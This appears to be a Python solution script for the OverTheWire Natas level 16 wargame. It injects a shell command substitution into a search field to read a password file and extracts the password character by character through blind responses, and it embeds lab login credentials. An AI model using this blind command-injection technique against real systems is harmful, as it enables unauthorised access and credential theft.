import requests

digits = [chr(i) for i in range (ord('0'), ord('9')+1)]
uppercase_letters = [chr(i) for i in range (ord('A'), ord('Z')+1)]
lowercase_letters = [chr(i) for i in range (ord('a'), ord('z')+1)]

valid_chars = digits + uppercase_letters + lowercase_letters

password = ""

while (len(password) < 32):
    for guess in valid_chars:
        response = requests.post("http://natas16.natas.labs.overthewire.org/index.php",
                                 data={"needle": "$(grep ^{}{} /etc/natas_webpass/natas17)Africans".format(password, guess)},
                                 headers={"Authorization": "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA===="})
        if "Africans" in response.content.decode("utf-8"):
            continue
        else:
            password += guess
            print("Updated password: %s" % password)
            break
print("\nFinal password: %s" % password)
